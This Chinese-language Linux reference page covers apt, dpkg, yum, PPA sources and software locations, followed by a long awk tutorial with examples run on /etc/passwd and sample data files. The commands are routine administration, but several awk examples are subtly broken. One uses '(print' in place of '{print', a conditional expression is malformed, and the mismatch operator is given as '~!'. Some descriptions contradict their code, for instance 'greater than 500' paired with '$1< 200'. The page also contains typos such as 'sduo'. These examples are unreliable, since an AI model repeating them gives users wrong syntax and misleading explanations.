echo "packagename install" | sudo dpkg --set-selections  # 从 HOLD 状态恢复软件包裹标志位
sudo dpkg --get-selections | grep hold                   # 查询当前系统被锁定不更新的软件包状态(hold)

查询指定软件有多少个版本
apt-cache madison vim
apt-cache policy vim
apt-cache showpkg vim
aptitude versions vim
apt install -s vim     # 只是模拟安装时会安装哪些软件列表,但不会例举出每个软件有多少个版本
apt-cache show vim     # 查询指定包的详情,不管是否已经安装
dpkg -l vim # 效果和上面基本一致,但是结果是列表详情展示,会提示是否已经删除了之后还有依赖包没有删除等
dpkg -s vim # 必须是安装的包才能显示详情
dpkg-query -s vim # 同上,效果一致
apt-cache show package | grep Version
apt-show-versions | more

apt命令选项
-d,--download-only          仅下载,不安装
-f,--fix-broken             修复依赖问题(用于install和remove子命令)
-m,--ignore-missing,--fix-missing 忽略缺失的软件包。遇到无法下载的软件包,自动忽略
--no-download               禁止下载软件包。与-m配合,可以使apt只使用已经下载的软件包
-q,--quiet                  静默模式,输出的信息适合做日志
-s,--simulate,--just-print  模拟测试,不做出实际操作,不改变系统
-y,--yes,--assume-yes       在系统提问时,自动应答yes
-u,--show-upgraded          显示已升级的软件包
-V,--verbose-versions       显示已安装和已升级的软件包的完整版本号
-b,--compile,--build        在源码包下载完成后进行编译
--ignore-hold               忽略被保留的软件包
--no-upgrade                不要升级软件包
--force-yes                 强制回答yes
--print-uris                仅答应软件包地址,不安装
--purge                     彻底删除,包括配置文件
--reinstall                 重新安装软件包

【 add-apt-repository 】
add-apt-repository ppa:
add-apt-repository:

Ubuntu里PPA代表一种非稳定版本到发布,喜欢尝试鲜到人一般会加入很多PPA源
add-apt-repository是由python-software-properties这个工具包提供的,所以要先安装python-software-properties才能使用add-apt-repository,否则会显示"command not found"

安装方法:apt-get install python-software-properties

sudo apt-get install python-software-properties
sudo apt-get update

sudo apt install software-properties-common
sudo apt-get update

PPA全称为Personal Package Archives(个人软件包档案),是Ubuntu Launchpad网站提供的一项服务,当然不仅限于Launchpad。它允许个人用户上传软件源代码,通过Launchpad进行编译并发布为二进制软件包,作为apt/新立得源供其他用户下载和更新。在Launchpad网站上的每一个用户和团队都可以拥有一个或多个PPA。 通常PPA源里的软件是官方源里没有的,或者是最新版本的软件。相对于通过Deb包安装来说,使用PPA的好处是一旦软件有更新通过sudo apt-get upgrade命令就可以直接升级到新版本。

如何通过PPA源来安装软件: 通常可以通过Google来搜索一些常用软件的PPA源,也可直接到launchpad.net上去搜索,搜索到后就可以直接用sudo apt-add-repository命令把PPA源添加到Source list中了。 比如FireFox PPA源:https://launchpad.net/~ubuntu-mozilla-daily/+archive/ppa ,可以在这里找到ppa:ubuntu-mozilla-daily/ppa的字样,然后通过以下命令把这个源加入到source list中。 sudo apt-add-repository ppa:ubuntu-mozilla-daily/ppa 然后再从下面的Packages列表中找到适用于当前Ubuntu版的FireFox 4.0包名称,更新源并安装: sduo apt-get update && sudo apt-get install firefox-4.0

使用方法:
搜索nginx ppa,然后在nginx官网查找ppa

apt-add-repository 'deb http://myserver/path/to/repo stable myrepo'
apt-add-repository 'http://myserver/path/to/repo myrepo'
apt-add-repository 'https://packages.medibuntu.org free non-free'
apt-add-repository http://extras.ubuntu.com/ubuntu
apt-add-repository ppa:user/repository
apt-add-repository ppa:user/distro/repository
apt-add-repository multiverse

安装python3.6
apt-get install software-properties-common  # 要从PPA安装一个软件时通常会先执行该命令
add-apt-repository ppa:jonathonf/python-3.6
apt-get update
apt-get install python3.6

除命令行方式外,Ubuntu还提供了GUI界面的第三方源管理工具,另外Ubuntu-Tweak中也包含大量第三方源,可通过一键安装第三方软件
Ubuntu Tweak是一款专门为Ubuntu准备的配置、调整工具,主要面向新手级的普通用户,它可以设置很多并不能在系统首选项中设置的隐藏选项,以满足用户自定义的乐趣。即使是新手,也可以方便地通过它来进行适合自己的系统调整。

安装方法:
一、可以到官网下载ubuntu-tweak的deb安装包然后进行安装
二、添加ubuntu-tweak官方源然后安装
1.系统—>系统管理—>软件源—>其他软件—>添加—>(输入) ppa:tualatrix/ppa—>添加源—>关闭
(与上面等效的方法:终端输入sudo add-apt-repository ppa:tualatrix/ppa )
终端里输入: sudo apt-get update 来更新源
完成上面的内容,打开终端输入: sudo apt-get install ubuntu-tweak 即可安装ubuntu-tweak

【 ubuntu中查找软件的安装位置 】
在终端里输入软件名称按两下tab键

php --help                         # 查看配置文件路径
ps aux | grep php                  # 查看配置文件路径
php -r "phpinfo();" | grep php.in  # 查看配置文件路径

apt的相关文件
/etc/apt/sources.list           设置软件包的获取来源
/etc/apt/apt.conf               apt配置文件
/etc/apt/apt.conf.d/            apt的零碎配置文件
/etc/apt/preferences            版本参数
/var/cache/apt/archives/        存放已经下载的软件包
/var/cache/apt/archives/partial 存放正在下载的软件包
/var/lib/apt/lists/             存放已经下载的软件包详细信息
/var/lib/apt/lists/partial/     存放正在下载的软件包详细信息

文档一般在 /usr/share
可执行文件 /usr/bin
配置文件   /etc
lib文件    /usr/lib

关于软件安装目录的说明:
一般的deb包(包括apt-get下载的)都在/usr/share。
自己下载的压缩包或者编译的包,有些可以选择安装目录,一般放在/usr/local/,也有在/opt的。

关于apt的缓存目录:
默认的缓存目录是/var/cache/apt/archives/
为日后重装系统后安装软件节省下载时间或者将软件包给别人用,可以将该目录下的软件包压缩备份后清理以节省空间。

ubuntu中的软件可通过图形界面的软件中心安装,也可以通过命令行apt-get install安装。但是安装后的软件的位置跟windows环境下安装软件的路径选择不一样。ubuntu中可供调用的终端大都在/usr/bin或/opt,可尝试用下面的方法快速找到软件的位置
1.执行该程序
2.用命令 ps -e 找到该程序的名字

找文件位置的命令
find softwarename
which softwarename # 查找命令的可执行文件的位置
whereis softwarename # 查找包含该命令的文件位置
locate softwarename

使用apt install命令安装的软件
dpkg -S softwarename  # 查看文件来自哪个deb包
dpkg -l softwarename  # 列出系统所有的安装过的deb包
dpkg -L softwarename  # 列出package安装的所有文件清单

【 卸载删除软件 】
方法一、知道要删除软件的具体名称
sudo apt purge 软件名称
sudo apt remove --purge 软件名称
sudo apt autoremove --purge 软件名称

方法二、不知道要删除软件的具体名称
dpkg --get-selections | grep docker | cut -f1 | sudo xargs apt purge
dpkg -l | grep dockerd* | awk '{print $2}' | sudo xargs apt purge
dpkg -l | grep ^rc | awk '{print $2}' | sudo xargs dpkg -P

$ dpkg --get-selections | egrep "(mysql|php|nginx)" | cut -f1 | sudo xargs apt purge
# apt purge `dpkg --get-selections | egrep "(mysql|php|nginx)" | cut -f1` && apt autoremove

卸载源代码编译的的软件:
$ cd 源代码目录
$ make clean
$ ./configure
$(make)
$ make uninstall
$ rm -rf 目录

清理系统:
$ sudo apt autoclean && sudo apt clean && sudo apt autoremove

【 Red Hat、Fedora和Ubuntu软件包操作对比 】
任务                              Red Hat、Fedora         Ubuntu
1、基本信息
软件包后缀                         *.rpm                  *.deb
软件源配置文件                     /etc/yum.conf          /etc/apt/sources.list

2、安装、删除、升级软件包
更新软件信息数据库                 每次运行yum时自动执行    apt update
从软件仓库安装软件                 yum install package    apt install package
安装一个已下载的软件包              yum install pkg.rpm    dpkg -i pkg.deb 或 dpkg --install pkg.deb
删除软件包                         rpm -e package         apt remove package
自动删除不需要的包                                         apt autoremove
软件包升级检查/测试                 yum check-update       apt -s upgrade 或 apt -s dist-upgrade
升级更新所有可升级的已安装的软件包   yum update             apt upgrade
                                  rpm -Uvh [args]
在升级软件包时自动处理依赖关系                              apt full-upgrade
升级整个系统                       yum upgrade apt-get    dist-upgrade

3、软件包信息
搜索应用程序                                              apt search 或 apt-cache search
获取某软件包的信息                  yum search package    apt show package 或 apt-cache show package
获取所有软件包的信息                yum list available     apt-cache dumpavail
显示所有已安装的软件                yum list installed     dpkg -l 或 dpkg --list
获取某个已安装软件包的信息          yum info package        dpkg --status package
                                  rpm -qi package
列出某个已安装软件包所包含的文件列表 rpm -ql package
列出某个已安装软件包所包含的文档     rpm -qd package            无
列出某个已安装软件包所包含的配置文件 rpm -qc package            无
显示某个软件包所依赖的软件包列表     rpm -qR package            apt-cache depends package
显示某个软件包的反向依赖关系        rpm -q -whatrequires [args] apt-cache rdepends package

4、软件包文件信息
获取某个软件包文件的信息           rpm -qpi pkg.rpm              dpkg --info pkg.deb
获取某个软件包文件所包含的文件列表  rpm -qpl pkg.rpm              dpkg --contents pkg.deb
获取某个软件包文件所包含的文档      rpm -qpd pkg.rpm              无
获取某个软件包文件所包含的配置文件  rpm -qpc pkg.rpm              无
软件包解压                        rpm2cpio pkg.rpm | cpio -vid  dpkg-deb --extract pkg.deb
搜索某个文件是由哪个软件包安装的    rpm -qf /file/name            dpkg -S /file/name 或 dpkg --search /file/name
搜索所有提供某个文件的软件包        yum provides /file/name       apt-file search /file/name

5、杂项
显示本地软件包缓存的状态            无                           apt-cache stats
校验所有已安装的软件包              rpm -Va                      debsums
删除本地缓存的所有软件包            yum clean packages           apt-get clean
仅删除本地缓存中过时的软件包        无                           apt-get autoclean
删除所有软件包信息                 yum clean headers            apt-file purge

【Ubuntu怎么打开已经安装的程序】
Ubuntu下启动已安装的软件可以通过终端进入该软件目录,命令运行,或建快捷方式(跟Windows下类似),这里以Firefox为例:

终端启动软件方法:
1.把Firefox安装文件拷贝到/usr/local目录下
sudo mv Firefox**.tar.gz /usr/local
2.进入/usr/local,解压Firefox**.tar.gz
sudo tar -jxvf Firefox**.tar.gz
3.进入Firefox目录,运行firefox
cd Firefox
./firefox

建立桌面快捷方式:
1.创建一个文件名为Firefox.desktop文件,将下面的代码拷贝进去
[Desktop Entry]
Categories=Development;
Comment[zh_CN]=
Comment=
Exec=/usr/local/Firefox #Exec=软件执行文件的路径
GenericName[zh_CN]=IDE
GenericName=IDE
Icon=/usr/local/Firefox/icon.xpm #Icon=快捷方式图标
MimeType=
Name[zh_CN]=eclipse
Name=火狐浏览器 #Name=快捷方式名称
Path=
StartupNotify=true
Terminal=false
Type=Application
X-DBUS-ServiceName=
X-DBUS-StartupType=
X-KDE-SubstituteUID=false
X-KDE-Username=owen
2.给文件添加可执行权限
chmod +x Firefox.desktop

3.将该文件复制到桌面
在ubuntu11.04之前的版本中,有更简单的方法来创建桌面快捷方式:右键点击桌面-创建启动器即可。

【yum命令】
yum(Yellow dog Updater, Modified)是一个在Fedora和RedHat以及SUSE中的Shell前端软件包管理器。
基于RPM包管理,能够从指定的服务器自动下载RPM包并且安装,可以自动处理依赖性关系,并且一次安装所有依赖的软体包,无须繁琐地一次次下载、安装。
yum提供了查找、安装、删除某一个、一组甚至全部软件包的命令,而且命令简洁而又好记。

yum 语法
yum [options] [command] [package ...]
options 可选,选项包括-h(帮助),-y(安装时提示选择全为"yes"),-q(不显示安装的过程)
command  要进行的操作。
package  操作的对象。

常用命令
1.列出所有可更新的软件清单命令:yum check-update
2.更新所有软件命令:yum update
3.仅安装指定的软件命令:yum install package_name
4.仅更新指定的软件命令:yum update package_name
5.列出所有可安裝的软件清单命令:yum list
6.删除软件包命令:yum remove package_name
7.查找软件包 命令:yum search keyword
8.清除缓存命令:
yum clean packages: 清除缓存目录下的软件包
yum clean headers: 清除缓存目录下的 headers
yum clean oldheaders: 清除缓存目录下旧的 headers
yum clean, yum clean all(= yum clean packages; yum clean oldheaders) :清除缓存目录下的软件包及旧的headers

yum list pam*  // 利用 yum 的功能,找出以 pam 为开头的软件名称有哪些

</pre>
</div>

<div id="awk">
<h3>awk命令用法</h3><pre>
awk是一种编程语言,用于在linux/unix下对文本和数据进行处理。数据可以来自标准输入、一个或多个文件,或其它命令的输出。它支持用户自定义函数和动态正则表达式等先进功能,是linux/unix下的一个强大编程工具。它在命令行中使用,但更多是作为脚本来使用。

awk是一个强大的文本分析工具,相对于grep的查找,sed的编辑,awk在其对数据分析并生成报告时,显得尤为强大。简单来说awk就是把文件逐行的读入,以空格为默认分隔符将每行切片,切开的部分再进行各种分析处理。

awk的处理文本和数据的方式是这样的,它逐行扫描文件,从第一行到最后一行,寻找匹配的特定模式的行,并在这些行上进行想要的操作。如果没有指定处理动作,则把匹配的行显示到标准输出(屏幕),如果没有指定模式,则所有被操作所指定的行都被处理。

awk分别代表其作者姓氏的第一个字母Alfred Aho、Brian Kernighan、Peter Weinberger。gawk是awk的GNU版本,它提供了Bell实验室和GNU的一些扩展,在linux系统中已把awk链接到gawk

awk有3个不同版本: awk、nawk和gawk,未作特别说明,一般指gawk,gawk是AWK的GNU版本

windows上的awk:gawk.exe,这样在windows上也能享受awk处理数据的方便性

通常awk是以文件的一行为处理单位的。awk每接收文件的一行,然后执行相应的命令来处理文本。

【awk中同时提供了print和printf两种打印输出的函数】
其中print函数的参数可以是变量、数值或者字符串。字符串必须用双引号引用,参数用逗号分隔。如果没有逗号,参数就串联在一起而无法区分。这里,逗号的作用与输出文件的分隔符的作用是一样的,只是后者是空格而已。

【有三种方式调用awk】
1.命令行方式
awk [-F  field-separator]  'commands'  input-file(s)
其中commands是真正awk命令,[-F域分隔符]是可选的。 input-file(s) 是待处理的文件。
在awk中文件的每一行中,由域分隔符分开的每一项称为一个域。通常在不指名-F域分隔符的情况下,默认的域分隔符是空格。

2.shell脚本方式
将所有的awk命令插入一个文件,并使awk程序可执行,然后awk命令解释器作为脚本的首行,一遍通过键入脚本名称来调用。
相当于shell脚本首行的:#!/bin/sh
可以换成:#!/bin/awk

3.将所有的awk命令插入一个单独文件,然后调用:
awk -f awk-script-file input-file(s)
其中,-f选项加载awk-script-file中的awk脚本,input-file(s)跟上面的是一样的。

</pre><textarea>$ last -n 5 <==仅取出前五行
root     pts/1   192.168.1.100  Tue Feb 10 11:21   still logged in
root     pts/1   192.168.1.100  Tue Feb 10 00:46 - 02:28 (01:41)
root     pts/1   192.168.1.100  Mon Feb  9 11:41 - 18:30 (06:48)
dmtsai   pts/1   192.168.1.100  Mon Feb  9 11:41 - 11:41 (00:00)
root     tty1                   Fri Sep  5 14:09 - 14:10 (00:01)

$ last -n 5 | awk  '{print $1}'
root
root
root
dmtsai
root

awk工作流程是这样的:读入有'\n'换行符分割的一条记录,然后将记录按指定的域分隔符划分域,填充域,$0则表示所有域,$1表示第一个域,$n表示第n个域,默认域分隔符是"空白键" 或 "[tab]键",所以$1表示登录用户,$3表示登录用户ip,以此类推

</textarea><textarea>$ awk -F ':' 'NR <= 5 {print $1}' /etc/passwd

$ cat /etc/passwd |awk  -F ':'  '{print $1}'
root
daemon
bin
sys
这种是awk+action的示例,每行都会执行action{print $1}。
-F指定域分隔符为':'

如果只是显示/etc/passwd的账户和账户对应的shell,而账户与shell之间以tab键分割
#cat /etc/passwd |awk  -F ':'  '{print $1"\t"$7}'
root    /bin/bash
daemon  /bin/sh
bin     /bin/sh
sys     /bin/sh

如果只是显示/etc/passwd的账户和账户对应的shell,而账户与shell之间以逗号分割,而且在所有行添加列名name,shell,在最后一行添加"blue,/bin/nosh"。
cat /etc/passwd |awk  -F ':'  'BEGIN {print "name,shell"}  {print $1","$7} END {print "blue,/bin/nosh"}'
name,shell
root,/bin/bash
daemon,/bin/sh
bin,/bin/sh
sys,/bin/sh
....
blue,/bin/nosh
awk工作流程是这样的:先执行BEGIN,然后读取文件,读入有/n换行符分割的一条记录,然后将记录按指定的域分隔符划分域,填充域,$0则表示所有域,$1表示第一个域,$n表示第n个域,随后开始执行模式所对应的动作action。接着开始读入第二条记录······直到所有的记录都读完,最后执行END操作。

搜索/etc/passwd有root关键字的所有行
#awk -F: '/root/' /etc/passwd
root:x:0:0:root:/root:/bin/bash
这种是pattern的使用示例,匹配了pattern(这里是root)的行才会执行action(没有指定action,默认输出每行的内容)。
搜索支持正则,例如找root开头的: awk -F: '/^root/' /etc/passwd

搜索/etc/passwd有root关键字的所有行,并显示对应的shell
$ awk -F: '/root/{print $7}' /etc/passwd
/bin/bash
这里指定了action{print $7}

</textarea><pre>
【awk的语法有两种形式】
awk [options] 'awkscript' var=value file(s)
awk [options] -f awkscriptfile var=value file(s)

在awk中仅仅只有两种数据类型: 数值 和 字符构成的字符串

命令行中的程序是用单引号包围着的。这会防止shell解释程序中 $ 这样的字符,也允许程序的长度超过一行。
程序的动作部分可以在一行上放多个语句,不过要使用分号进行分隔

在任何情况下, 程序都可以用引号包含起来放到awk命令的一个参数中运行,或者把它放到一个文件中使用awk的-f参数调用它
当程序比较短小(几行的长度)的时候,这种约定会很方便
如果程序较长将程序写到一个单独的文件中会更加方便。假设存在程序 progfile ,输入命令行::
awk -f progfile     optional list of input files
其中 -f 选项指示awk从指定文件中获取程序progfile

模式-动作语句以及动作中的语句通常以换行分隔,如果它们以分号分隔则多个语句可以出现在一行中。分号可以放在任意语句的尾部
动作的开大括号必须与其对应的模式处于同一行;动作的其余部分,包括闭大括号,则可以出现接下来的行中
空行会被忽略;一般为了提高程序的可读性会在语句的前面或者后面插入空行。在操作符和操作数的两边插入空格和制表符也是为了提高可读性。

任意行的末尾可能会有注释。注释以符号 # 开始,结束于行尾

长语句可以跨越多行,但要在断行的地方加入一个反斜杠和一个换行符,语句也可以逗号断行,在每个断行的末尾也可以加入注释
{ print \
  $1,        # country name
  $2,        # area in thousands of square miles
  $3 }       # population in millions

【命令选项】
-F fs or --field-separator fs
指定输入文件折分字段分隔符,fs是一个字符串或者是一个正则表达式,如-F:。
默认的分隔符是连续的空格或制表符

-v var=value or --asign var=value
赋值一个用户定义变量。定义变量并赋值 也可以借用此方式从shell变量中引入

-f scripfile or --file scriptfile
从脚本文件中读取awk命令。

-mf nnn and -mr nnn
对nnn值设置内在限制,-mf选项限制分配给nnn的最大块数目;-mr选项限制记录的最大数目。这两个功能是Bell实验室版awk的扩展功能,在标准awk中不适用。

-W compact or --compat, -W traditional or --traditional
在兼容模式下运行awk。所以gawk的行为和标准的awk完全一样,所有的awk扩展都被忽略。

-W copyleft or --copyleft, -W copyright or --copyright
打印简短的版权信息。

-W help or --help, -W usage or --usage
打印全部awk选项和每个选项的简短说明。

-W lint or --lint
打印不能向传统unix平台移植的结构的警告。

-W lint-old or --lint-old
打印关于不能向传统unix平台移植的结构的警告。

-W posix
打开兼容模式。但有以下限制,不识别:\x、函数关键字、func、换码序列以及当fs是一个空格时,将新行作为一个域分隔符;操作符**和**=不能代替^和^=;fflush无效。

-W re-interval or --re-inerval
允许间隔正则表达式的使用,参考(grep中的Posix字符类),如括号表达式[[:alpha:]]。

-W source program-text or --source program-text
使用program-text作为源代码,可与-f命令混用。

-W version or --version
打印bug报告信息的版本。

【模式和操作】
awk脚本是由模式和操作组成的:
pattern {action} 如$ awk '/root/' test,或$ awk '$3 < 100' test。
两者是可选的,如果没有模式则action应用到全部记录,如果没有action则输出匹配全部记录。
由于模式和动作两者任一都是可选的,所以需要使用大括号包围动作以区分于其他模式
默认情况下,每一个输入行都是一条记录,但用户可通过RS变量指定不同的分隔符进行分隔。

awk [options] 'BEGIN{action} pattern{ action;...}END{action;...}' file..

模式
模式可以是以下任意一个:
1、/正则表达式/ { 语句 }
使用通配符的扩展集。
2、关系表达式 { 语句 }
可以用下面运算符表中的关系运算符进行操作,可以是字符串或数字的比较,如$2>%1选择第二个字段比第一个字段长的行
3、模式匹配表达式 { 语句 }
用运算符~(匹配)和~!(不匹配)。
4、模式,模式 { 语句 }
指定一个行的范围。该语法不能包括BEGIN和END模式。
5、BEGIN { 语句 }
让用户指定在第一条输入记录被处理之前所发生的动作,通常可在这里设置全局变量。
6、END { 语句 }
让用户在最后一条输入记录被读取之后发生的动作。

BEGIN和END不与其他模式组合。范围模式不可以是任何其他模式的一部分。BEGIN和END是仅有的必须搭配动作的模式

操作
操作由一或多个命令、函数、表达式组成,之间由换行符或分号隔开,并位于大括号内。主要有四部份:
1、变量或数组赋值
2、输出命令
3、内置函数
4、控制流命令

【模式】
通过对比选择
$2 >= 5

通过计算选择
$2 * $3 > 50 { printf("$%.2f for %s\n", $2 * $3, $1) }

通过文本内容选择
除了数值测试,还可以选择包含特定单词或短语的输入行。这个程序会打印所有第一个字段为 Susie 的行::
$1 == "Susie"
操作符 == 用于测试相等性。你也可以使用称为 正则表达式 的模式查找包含任意字母组合,单词或短语的文本。这个程序打印任意位置包含 Susie 的行::
/Susie/

模式组合
可以使用括号和逻辑操作符与&&,或||,以及非!对模式进行组合
$2 >= 4 || $3 >= 20

数据验证
实际的数据中总是会存在错误的。在数据验证-检查数据的值是否合理以及格式是否正确-方面,Awk是个优秀的工具。
数据验证本质上是否定的:不是打印具备期望属性的行,而是打印可疑的行。如下程序使用对比模式 将5个数据合理性测试应用于 emp.data 的每一行::
NF != 3     { print $0, "number of fields is not equal to 3" }
$2 < 3.35   { print $0, "rate is below minimum wage" }
$2 > 10     { print $0, "rate exceeds $10 per hour" }
$3 < 0      { print $0, "negative hours worked" }
$3 > 60     { print $0, "too many hours worked" }
如果没有错误,则没有输出。

特殊模式BEGIN用于匹配第一个输入文件的第一行之前的位置
END则用于匹配处理过的最后一个文件的最后一行之后的位置

普通的 print 是打印当前输入行,与之不同的是 print "" 会打印一个空行
这个程序使用 BEGIN 来输出一个标题:
BEGIN { print "Name    RATE    HOURS"; print ""}
      { print }

【匹配操作符(~)】
用来在记录或者域内匹配正则表达式。如$ awk '$1 ~/^root/' test,将显示test文件第一列中以root开头的行

【比较表达式】
conditional expression1 ? expression2: expression3
例如:$ awk '{max = {$1 > $3} ? $1: $3: print max}' test。如果第一个域大于第三个域,$1就赋值给max,否则$3就赋值给max。

$ awk '$1 + $2 < 100' test      如果第一和第二个域相加大于100,则打印这些行。
$ awk '$1 > 5 && $2 < 10' test  如果第一个域大于5,并且第二个域小于10,则打印这些行。

【范围模板】
范围模板匹配从第一个模板的第一次出现到第二个模板的第一次出现之间所有行。如果有一个模板没出现,则匹配到开头或末尾
如$ awk '/root/,/mysql/' test  # 将显示root第一次出现到mysql第一次出现之间的所有行。

</pre>再看几个条件判断的例子<textarea>$ cat aa.txt
123 root
345 wangshibo
456 opt
789 nginx
100 wangshibo
200 huanqiu
300 hqtime

打印aa.txt文件中第二列包含wang字符的内容
$ awk '$2~/wang/ {print $0}' aa.txt

打印aa.txt文件中第二列不包含wang字符的内容
$ awk '$2 !~/wang/ {print $0}' aa.txt

打印aa.txt文件中第二列以wang字符开头的内容
$ awk '$2~/^wang/ {print $0}' aa.txt

打印aa.txt文件中第二列以bo字符结尾的内容
$ awk '$2~/bo$/ {print $0}' aa.txt

打印aa.txt文件中第二列是wangshibo的内容(精确匹配)
$ awk '$2=="wangshibo" {print $0}' aa.txt

打印aa.txt文件中第二列不是wangshibo的内容
$ awk '$2!="wangshibo" {print $0}' aa.txt

打印aa.txt文件中第一列数字大于500的内容
$ awk '$1>500 {print $0}' aa.txt

打印aa.txt文件中第一列数字大于500且第二列是wangshibo的内容
$ awk '$1< 200 && $2=="wangshibo" {print $0}' aa.txt

打印aa.txt文件中第一列数字大于500或是第二列是wangshibo的内容
$ awk '$1< 200 || $2=="wangshibo" {print $0}' aa.txt

</textarea><pre>
【BEGIN模块】
BEGIN模块后紧跟着动作块,这个动作块在awk处理任何输入文件之前执行。所以它可以在没有任何输入的情况下进行测试。它通常用来改变内建变量的值,如OFS,RS和FS等,以及打印标题。如:$ awk 'BEGIN{FS=":"; OFS="\t"; ORS="\n\n"}{print $1,$2,$3} test。上式表示,在处理输入文件以前,域分隔符(FS)被设为冒号,输出文件分隔符(OFS)被设置为制表符,输出记录分隔符(ORS)被设置为两个换行符。$ awk 'BEGIN{print "TITLE TEST"}只打印标题。

【END模块】
END不匹配任何的输入文件,但是执行动作块中的所有动作,它在整个输入文件处理完成后被执行
如$ awk 'END{print "The number of records is" NR}' test,上式将打印所有被处理的记录数。

</pre><textarea>awk '$3 >0 { print $1, $2 * $3 }' emp.data
该命令行告诉系统执行引号内的awk程序,从输入文件emp.data获取程序所需的数据。引号内的部分是个完整的awk程序,包含单个模式-动作语句。模式 $3>0 用于匹配第三列大于0的输入行,动作打印每个匹配行的第一个字段以及第二第三字段的乘积。

使用awk来对文件随机抽取n行
awk 'BEGIN{srand()} {print rand()"\t"$0}' test | sort -nk 1 | head -n 5 | awk -F "\t" '{print $2}'

$ awk '/^(no|so)/' test
打印所有以模式no或so开头的行。

$ awk '/^[ns]/{print $1}' test
如果记录以n或s开头,就打印这个记录。

$ awk '$1 ~/[0-9][0-9]$/(print $1}' test
如果第一个域以两个数字结束就打印这个记录。

$ awk '$1 == 100 || $2 < 50' test
如果第一个或等于100或者第二个域小于50,则打印该行。

$ awk '$1 != 10' test
如果第一个域不等于10就打印该行。

$ awk '/test/{print $1 + 10}' test
如果记录包含正则表达式test,则第一个域加10并打印出来。

$ awk '{print($1 > 5 ? "ok "$1: "error"$1)}' test
如果第一个域大于5则打印问号后面的表达式值,否则打印冒号后面的表达式值。

$ awk '/^root/,/^mysql/' test
打印以正则表达式root开头的记录到以正则表达式mysql开头的记录范围内的所有记录。如果找到一个新的正则表达式root开头的记录,则继续打印直到下一个以正则表达式mysql开头的记录为止,或到文件末尾。

打印uid在30~40范围内的用户名。
awk -F: '$3 >=30 &&  $3<=40 {print $1}' /etc/passwd
打印第5-10行的行号和用户名
awk -F: 'NR>=5 && NR<=10{print NR,$1}' /etc/passwd
打印奇数行
$ awk -F: '{if(NR%2==1) print $0}' /etc/passwd
打印偶数行
$ awk -F: '{if(NR%2==0) print $0}' /etc/passwd
打印字段数大于5的行
$ awk -F: 'NF>5{print $0}' /etc/passwd
打印UID不等于GID的用户名
awk -F: '$3!=$4{print $1}' /etc/passwd
打印没有指定shell的用户
awk -F: '$7==""{print $1}' /etc/passwd

</textarea><pre>
【执行AWK程序】
执行awk程序的方式有多种:
awk 'program' input files               #在每个指定的输入文件上执行这个program
awk '$3 == 0 { print $1 }' file1 file2  #打印file1和file2文件中第三个字段为0的每一行的第一个字段。

可以省略命令行中的输入文件,仅输入::
awk 'program'
这种情况下,awk会将program应用于终端中接着输入的任意数据行,直到你输入一个文件结束信号(Unix系统上为control-d)
如下是Unix系统的一个会话示例:
$ awk '$3 == 0 { print $1 }'
Beth 4.00 0
Beth
Kathy 3.75 10
Kathy 3.75 0
Kathy

【awk错误】
如果awk程序存在错误,awk会给一段诊断信息。例如打错了大括号

$ awk '$3 == 0 [ print $1 }' test
awk: cmd. line:1: $3 == 0 [ print $1 }
awk: cmd. line:1:         ^ syntax error
awk: cmd. line:1: $3 == 0 [ print $1 }
awk: cmd. line:1:                    ^ syntax error

【awk输出】
打印每一行
如果一个动作没有任何模式, 这个动作会对所有输入的行进行操作. print 语 句用来打印(输出)当前输入的行, 所以程序
{ print }
会输出所有输入的内容到标准输出. 由于 $0 表示整行,
{ print $0 }
也会做一样的事情

打印特定字段
使用一个print语句可以在同一行中输出不止一个字段
{ print $1, $3 }           # 输出了每行输入中的第一和第三个字段
{ print NF, $1, $NF }      # 依次打印出每一行的字段数量, 第一个字段的值, 最后一个字段的值
{ print $1, $2 * $3 }      # 对字段的值进行计算后再打印出来
{ print NR, $0 }           # NR存储当前已经读取了多少行的计数,使用NR和$0给数据的每一行加上行号
{ print "total pay for", $1, "is", $2 * $3 }             # 双引号内的文字将会在字段和计算的值中插入输出

格式化输出
{ printf("total pay for %s is $%.2f\n", $1, $2 * $3) }   # %.2f以数字的方式打印第二个值$2*$3,保留小数点后两位,\n换行
{ printf("%-8s $%6.2f\n", $1, $2 * $3) }                 # 第一个规格%-8s将一个姓名以字符串形式在8个字符宽度的字段中左对齐输出。第二个规格%6.2f将薪酬以数字的形式,保留小数点后两位,在6个字符宽度的字段中输出

排序输出
awk '{ printf("%6.2f    %s\n", $2 * $3, $0) }' emp.data | sort  # 将awk的输出通过管道传给sort命令来处理

【使用AWK自定义变量进行计算】
计数
这个程序使用一个变量emp来统计工作超过15个小时的员工的数目,用作数字的awk变量的默认初始值为0,所以不需要初始化 emp
$3 > 15 { emp = emp + 1 }
END     { print emp, "employees worked more than 15 hours" }

求和与平均值
计算员工的数目可以使用内置变量NR,它保存着到目前位置读取的行数;在所有输入的结尾它的值就是所读的所有行数。
END { print NR, "employees" }

使用NR来计算薪酬均值的程序,有个潜在的错误:NR等于0,那么程序会试图执行零除,从而产生错误信息
    { pay = pay + $2 * $3 }
END { print NR, "employees"
      print "total pay is", pay
      print "average pay is", pay/NR
    }

处理文本
awk的优势之一是能像大多数语言处理数字一样方便地处理字符串。awk变量可以保存数字也可以保存字符串
找出时薪最高的员工:
$2 > maxrate { maxrate = $2; maxemp = $1 }
END { print "highest hourly rate:", maxrate, "for", maxemp }
变量maxrate保存着一个数值,而变量maxemp则是保存着一个字符串;如果有几个员工都有着相同的最大时薪,该程序则只找出第一个

字符串连接
可以合并老字符串来创建新字符串。这种操作称为 连接(concatenation) 。程序
    { names = names $1 " "}
END { print names }
通过将每个姓名和一个空格附加到变量names的前一个值,来将所有员工的姓名收集进单个字符串中。最后END动作打印出names的值

awk程序中,连接操作的表现形式是将字符串值一个接一个地写出来。对于每个输入行,程序的第一个语句先连接三个字符串: names 的前一个值、当前行的第一个字段以及一个空格,然后将得到的字符串赋值给 names 。因此,读取所有的输入行之后, names 就是个字符串,包含所有员工的姓名,每个姓名后面跟着一个空格。用于保存字符串的变量的默认初始值是空字符串(也就是说该字符串包含零个字符),因此这个程序中的 names 不需要显式初始化

打印最后一个输入行
虽然在 END 动作中 NR 还保留着它的值,但 $0 没有
    { last = $0 }
END { print last }

行、单词以及字符的计数
这个程序使用了 length 、 NF 、以及 NR 来统计输入中行、单词以及字符的数量。为了简便,我们将每个字段看作一个单词。
    { nc = nc + length($0) + 1
      nw = nw + NF
    }
END { print NR, "lines,", nw, "words,", nc, "characters" }
文件 emp.data 有:
6 lines, 18 words, 77 characters
$0 并不包含每个输入行的末尾的换行符,所以要另外加个1。

【awk的环境变量】
$n          当前记录的第n个字段,字段间由FS分隔。
$0          完整的输入记录。
ARGC        命令行参数的数目。
